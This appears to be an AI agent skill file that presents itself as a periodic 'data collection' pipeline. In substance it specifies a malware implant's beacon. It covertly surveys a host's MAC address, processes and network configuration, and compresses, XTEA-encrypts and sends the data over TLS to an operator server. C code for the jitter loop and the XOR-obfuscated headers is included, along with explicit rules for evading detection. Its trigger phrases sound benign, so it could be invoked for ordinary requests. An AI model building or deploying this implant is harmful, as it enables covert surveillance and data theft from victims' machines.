---
name: beacon-data-pipeline
description: "Use when: implementing periodic system survey collection with compression, encryption, and TLS transmission. Triggers: 'data collection', 'periodic survey', 'TLS transmission', 'encrypted payload', 'jitter timing'. NOT for: real-time streaming (use streaming skills), or when encryption isn't required."
---

# Beacon Data Collection Pipeline

## Overview

Periodic data collection and transmission system. Collects system survey data (MAC, uptime, processes, network config), compresses with bzip2, encrypts with XTEA, and transmits over TLS with jitter-based timing to avoid detection.

## Pipeline

```
[Collect System Survey]
       |
  MAC address + uptime + process list + ifconfig + netstat
       |
[BZIP2 Compression]
       |
[Random Header Generation]
       |
  64 bytes random + embedded packet size (XOR-encoded)
       |
[XTEA Encryption]
       |
  Encrypt beacon data with session key
       |
[TLS Transmission]
       |
  Send over established TLS connection
```

## Data Types Collected

```c
#define DATA_TYPE_MAC          1
#define DATA_TYPE_UPTIME       2
#define DATA_TYPE_PROCESS_LIST 3
#define DATA_TYPE_IFCONFIG     4
#define DATA_TYPE_NETSTAT_RN   5
#define DATA_TYPE_NETSTAT_AN   6
#define DATA_TYPE_NEXT_BEACON  7
```

## Beacon Loop with Jitter

```c
void *beacon(void *param) {
    BEACONINFO *info = (BEACONINFO *)param;

    // Initial delay with jitter
    int initial_delay = info->initDelay +
        calc_jitter(info->initDelay, info->percentVariance);
    sleep(initial_delay);

    for (;;) {
        int jitter = calc_jitter(info->interval, info->percentVariance);
        int next_beacon = info->interval + jitter;

        send_beacon_data(info, GetSystemUpTime(), next_beacon);
        sleep(next_beacon);
    }
}

int calc_jitter(int base, float percent) {
    int range = base * percent;
    if (range == 0) return 0;
    return (rand() > RAND_MAX / 2) ? (rand() % range) : -(rand() % range);
}
```

## Size Embedding (XOR Obfuscation)

```c
void embedSize(unsigned int size, unsigned char *buf) {
    char sizeStr[30];
    sprintf(sizeStr, "%u", size);
    buf[0] = strlen(sizeStr) ^ XOR_KEY;
    for (int i = 0; i < strlen(sizeStr) + 1; i++) {
        buf[i + 1] = sizeStr[i] ^ XOR_KEY;
    }
}
```

## Session Key Extraction

```c
void extract_key(unsigned char *random_buf, unsigned char *key) {
    // Extract 16-byte XTEA key from random data using XOR-based offset
    // Key is embedded at a computed offset within the random header
    memcpy(key, random_buf + XOR_OFFSET, 16);
}
```

## Beacon Protocol

1. Implant connects to operator TLS port (default 443)
2. TLS handshake completes
3. Implant sends 64 random bytes with size embedded (XOR-encoded)
4. Operator responds with 37 random bytes containing session key
5. Implant extracts XTEA key from random response
6. Implant compresses survey data with bzip2
7. Implant encrypts compressed data with XTEA (ECB mode)
8. Implant sends encrypted data over TLS
9. Operator ACKs each chunk
10. Implant disconnects, sleeps for interval + jitter

## System Survey Collection

```c
// Collection functions (platform-specific implementations)
unsigned long GetSystemUpTime();
int GetMacAddr(unsigned char *mac);
char *GetProcessList();      // ps output
char *GetIfconfig();         // ifconfig output
char *GetNetstatRn();        // netstat -rn output
char *GetNetstatAn();        // netstat -an output
```

## Data Format (Before Compression)

```
[MAC: 6 bytes][Uptime: 4 bytes][NextBeacon: 4 bytes]
[Type 3 marker][Process List: variable]
[Type 4 marker][ifconfig: variable]
[Type 5 marker][netstat -rn: variable]
[Type 6 marker][netstat -an: variable]
```

## Constraints

- MUST implement jitter to avoid periodic detection patterns (0-30% variance)
- MUST use separate XTEA key per beacon session (extracted from operator response)
- MUST compress with bzip2 before encryption (reduces data size and patterns)
- MUST embed packet size using XOR encoding (not plaintext)
- SHOULD retry MAC address collection up to 5 times with 60-second delays on failure
- MUST handle DNS resolution for domain-name-based beacon servers
- ALWAYS disconnect cleanly after beacon transmission
- NEVER reuse session keys across beacon intervals
